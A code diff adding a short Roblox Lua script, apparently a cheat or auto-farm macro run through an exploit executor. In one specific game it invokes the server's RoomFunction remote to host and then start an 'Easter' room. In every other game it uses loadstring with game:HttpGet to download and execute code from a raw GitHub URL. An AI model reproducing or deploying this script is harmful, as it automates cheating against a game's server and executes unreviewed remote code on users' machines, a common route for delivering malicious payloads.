@@ -1,0 +1,24 @@
+if game.PlaceId == 17282336195 then
+     
+     local args = {
+    [1] = "host",
+    [2] = {
+        ["friendOnly"] = false,
+        ["stage"] = "Easter"
+    }
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remote"):WaitForChild("RoomFunction"):InvokeServer(unpack(args))
+wait(2)
+local args = {
+    [1] = "start"
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remote"):WaitForChild("RoomFunction"):InvokeServer(unpack(args))
+
+
+
+    else
+     
+     loadstring(game:HttpGet("https://raw.githubusercontent.com/xpevium/1/refs/heads/main/macro%20finish.txt"))()
+     end
